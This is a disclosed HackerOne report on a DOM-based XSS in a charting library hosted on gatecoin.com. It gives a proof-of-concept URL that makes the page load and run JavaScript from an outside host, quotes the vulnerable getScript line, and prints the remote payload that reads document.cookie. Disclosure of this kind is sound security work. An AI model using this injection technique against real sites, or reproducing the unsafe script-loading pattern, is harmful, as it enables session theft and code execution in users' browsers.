---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '351275'
original_report_id: '351275'
title: DOM Based XSS charting_library
weakness: Cross-site Scripting (XSS) - DOM
team_handle: gatecoin
created_at: '2018-05-14T07:47:27.514Z'
disclosed_at: '2018-10-19T07:53:26.464Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: gatecoin.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM Based XSS charting_library

## Metadata

- HackerOne Report ID: 351275
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: gatecoin
- Disclosed At: 2018-10-19T07:53:26.464Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Description**
charting_library contains a DOM Based XSS vulnerability that allows to load an external JS script and execute it.

**PoC**
Open URL in any browser
```
https://gatecoin.com/widget-trade/assets/charting_library/static/tv-chart.html#indicatorsFile=//blackfan.ru/tv-chart-poc&disabledFeatures=[]&enabledFeatures=[]
```

**Vulnerable script**
https://gatecoin.com/widget-trade/assets/charting_library/static/bundles/library.js

**Vulnerable code**
```js
$.getScript(urlParams.indicatorsFile)
```

blackfan.ru/tv-chart-poc source
```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: cache-control, X-Requested-With");
?>
alert(document.domain); 
alert(document.cookie); 
```

## Impact

DOM Based XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
